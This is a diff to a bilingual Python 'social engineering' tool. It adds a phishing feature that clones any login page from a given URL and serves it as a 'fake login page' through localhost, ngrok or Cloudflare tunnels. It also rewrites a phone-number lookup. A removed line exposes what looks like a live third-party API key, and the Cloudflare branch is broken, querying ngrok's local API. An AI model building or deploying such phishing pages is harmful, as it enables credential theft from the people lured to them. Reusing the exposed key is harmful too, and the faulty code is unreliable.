@@ -6,15 +6,19 @@ import threading
 import http.server
 import socketserver
 import webbrowser
-import numlookupapi
 import nmap
 from colorama import init, Fore, Style
+from phonenumbers import parse, is_valid_number, format_number, PhoneNumberFormat
+import phonenumbers.geocoder as geocoder
+import phonenumbers.carrier as carrier
 
 # Porta para o servidor HTTP local
 PORT = 8080
 
 # Diretório onde os arquivos HTML e CSS serão armazenados
 HTML_CSS_DIR = 'html_css'
+if not os.path.exists(HTML_CSS_DIR):
+    os.makedirs(HTML_CSS_DIR)
 
 # Função para limpar a tela do console
 def clear_console():
@@ -233,100 +237,165 @@ def phishing_menu(language):
         if choice == '0':
             return
         elif choice == '1':
-            start_local_server(language)
+            clone_login_page(language)
         else:
             handle_invalid_option(language)
 
-# Função para iniciar o servidor local
-def start_local_server(language):
+def clone_login_page(language):
     clear_console()
     if language == '1':
-        print("Starting local server...")
+        url = input("Enter the URL of the page to clone: ")
+        print("Choose server:\n1. Localhost\n2. Ngrok\n3. Cloudflare")
     else:
-        print("Iniciando servidor local...")
+        url = input("Digite a URL da página a ser clonada: ")
+        print("Escolha o servidor:\n1. Localhost\n2. Ngrok\n3. Cloudflare")
 
-    # Definindo o manipulador do servidor
-    Handler = http.server.SimpleHTTPRequestHandler
+    server_choice = input("Choose server: ")
 
-    # Iniciando o servidor HTTP local
-    with socketserver.TCPServer(("", PORT), Handler) as httpd:
-        print(f"Local server running on port {PORT}")
+    # Diretório onde os arquivos HTML e CSS serão salvos
+    base_filename = os.path.basename(url)
+    html_path = os.path.join(HTML_CSS_DIR, f"{base_filename}.html")
+    css_path = os.path.join(HTML_CSS_DIR, f"{base_filename}.css")
 
-        # URL da página alvo para clonagem
-        target_url = f"http://localhost:{PORT}/fake_login_page.html"
+    try:
+        # Verificar se o arquivo HTML já existe
+        if not os.path.exists(html_path):
+            # Baixar o HTML da página
+            response = requests.get(url)
+            if response.status_code == 200:
+                with open(html_path, 'w') as file:
+                    file.write(response.text)
+                print("HTML downloaded successfully.")
 
-        try:
-            # Abrindo a página clonada no navegador padrão
+                # Lógica para extrair e baixar o CSS, se necessário
+                # Aqui você pode adicionar a lógica para extrair e baixar o CSS
+                # Exemplo simples:
+                css_content = "/* Adicione seu conteúdo CSS aqui */"
+                with open(css_path, 'w') as file:
+                    file.write(css_content)
+                print("CSS downloaded successfully.")
+            else:
+                print(Fore.RED + "Failed to download the page.")
+                return
+        else:
+            print(f"{Fore.GREEN}Arquivo HTML para {url} já existe, pulando o download.")
+
+    except Exception as e:
+        print(Fore.RED + f"Erro: {e}")
+        return
+
+    # Escolher o servidor para usar
+    if server_choice == '1':
+        start_local_server(language, html_path)
+    elif server_choice == '2':
+        start_ngrok_server(language, html_path)
+    elif server_choice == '3':
+        start_cloudflare_server(language, html_path)
+
+def start_local_server(language, html_path):
+    class Handler(http.server.SimpleHTTPRequestHandler):
+        def do_GET(self):
+            if self.path == '/':
+                self.path = html_path
+            return http.server.SimpleHTTPRequestHandler.do_GET(self)
+
+    clear_console()
+    print("Starting local server...")
+
+    try:
+        with socketserver.TCPServer(("", PORT), Handler) as httpd:
+            print(f"Local server running on port {PORT}")
+            target_url = f"http://localhost:{PORT}/{os.path.basename(html_path)}"
             print("Opening fake login page in browser...")
             time.sleep(2)
             webbrowser.open(target_url)
-
-            # Exibir mensagem simulada de credenciais digitadas em um novo terminal
-            open_new_terminal(language)
-
-            input("\nPressione Enter para parar o servidor...")
-        except Exception as e:
-            print(Fore.RED + f"Erro ao abrir a página: {e}")
-
-    # Parando o servidor após o uso
-    httpd.shutdown()
-
-# Função para exibir as credenciais digitadas em um novo terminal
-def open_new_terminal(language):
-    try:
-        # Abrir um novo terminal para exibir as credenciais digitadas
-        print("Credentials entered here...")
-        time.sleep(3)
+            input("\nPress Enter to stop the server...")
+            httpd.shutdown()
     except Exception as e:
-        print(Fore.RED + f"Error opening new terminal: {e}")
+        print(Fore.RED + f"Error starting server: {e}")
 
-# Função para informações de número de telefone
+def start_ngrok_server(language, html_path):
+    clear_console()
+    print("Starting ngrok server...")
+
+    try:
+        ngrok_process = subprocess.Popen(["ngrok", "http", str(PORT)], stdout=subprocess.PIPE)
+        time.sleep(5)  # Esperar ngrok iniciar
+        ngrok_url = "http://localhost:4040/api/tunnels"
+        tunnels_response = requests.get(ngrok_url).json()
+        public_url = tunnels_response['tunnels'][0]['public_url']
+        print(f"Ngrok URL: {public_url}")
+        print("Opening fake login page in browser...")
+        webbrowser.open(public_url)
+        input("\nPress Enter to stop the server...")
+        ngrok_process.terminate()
+    except Exception as e:
+        print(Fore.RED + f"Error starting ngrok server: {e}")
+
+def start_cloudflare_server(language, html_path):
+    clear_console()
+    print("Starting cloudflare server...")
+
+    try:
+        cloudflare_process = subprocess.Popen(["cloudflared", "tunnel", "http", str(PORT)], stdout=subprocess.PIPE)
+        time.sleep(5)  # Esperar Cloudflare iniciar
+        cloudflare_url = "http://localhost:4040/api/tunnels"
+        tunnels_response = requests.get(cloudflare_url).json()
+        public_url = tunnels_response['tunnels'][0]['public_url']
+        print(f"Cloudflare URL: {public_url}")
+        print("Opening fake login page in browser...")
+        webbrowser.open(public_url)
+        input("\nPress Enter to stop the server...")
+        cloudflare_process.terminate()
+    except Exception as e:
+        print(Fore.RED + f"Error starting cloudflare server: {e}")
+
+# Função para obter informações de número de telefone
 def phone_number_info(language):
     clear_console()
     if language == '1':
-        print("Phone Number Information")
-        print("Enter a phone number to obtain information (Country Code + Carrier area code):")
+        phone_number = input("Enter the phone number (e.g., +1234567890): ")
     else:
-        print("Informações de Número de Telefone")
-        print("Digite um número de telefone para obter informações(Código do País + DDD da operadora):")
+        phone_number = input("Digite o número de telefone (e.g., +1234567890): ")
 
-    phone_number = input("Phone number: ")
-
-    # Consulta à API numlookupapi para obter informações detalhadas
     try:
-        client = numlookupapi.Client('num_live_nPxUn5CQCi43HYw85qiaohr9FvykkoqCa1x8QkEy')  # Substitua 'YOUR-API-KEY' pelo seu API key
-        result = client.validate(phone_number)
-        
-        # Formatando a resposta no estilo desejado
-        print("\nInformation for phone number", phone_number)
-        print("Valid:", result.get("valid", False))
-        print("Number:", result.get("number", ""))
-        print("Local Format:", result.get("local_format", ""))
-        print("International Format:", result.get("international_format", ""))
-        print("Country Prefix:", result.get("country_prefix", ""))
-        print("Country Code:", result.get("country_code", ""))
-        print("Country Name:", result.get("country_name", ""))
-        print("Location:", result.get("location", ""))
-        print("Carrier:", result.get("carrier", ""))
-        print("Line Type:", result.get("line_type", ""))
-
+        number = parse(phone_number)
+        if is_valid_number(number):
+            info = {
+                "valid": True,
+                "number": phone_number,
+                "local_format": format_number(number, PhoneNumberFormat.NATIONAL),
+                "international_format": format_number(number, PhoneNumberFormat.INTERNATIONAL),
+                "country_prefix": number.country_code,
+                "country_code": number.country_code,
+                "country_name": geocoder.country_name_for_number(number, "en"),
+                "location": geocoder.description_for_number(number, "en"),
+                "carrier": carrier.name_for_number(number, "en"),
+            }
+            clear_console()
+            print("Phone Number Information".center(50, '-'))
+            for key, value in info.items():
+                print(f"{key}: {value}")
+        else:
+            print(Fore.RED + "No information found for this phone number.")
     except Exception as e:
-        print(Fore.RED + f"Error fetching phone number information: {e}")
+        print(Fore.RED + f"Error: {e}")
 
-    input("\nPress Enter to continue...")
+    input("\nPress Enter to return to the Social Engineering Tools menu...")
 
 # Função principal para iniciar o programa
 def start_program():
-    init(autoreset=True)
-    language = input("Choose language (1. English / 2. Portuguese): ")
+    clear_console()
+    print("1. English\n2. Português")
+    language = input("Choose a language / Escolha um idioma: ")
 
     if language not in ['1', '2']:
-        print("Invalid choice. Defaulting to English.")
-        language = '1'
+        handle_invalid_option('1')
+        return
 
     welcome_message(language)
+    loading_screen()
     main_menu(language)
 
-# Início do programa
 if __name__ == "__main__":
     start_program()
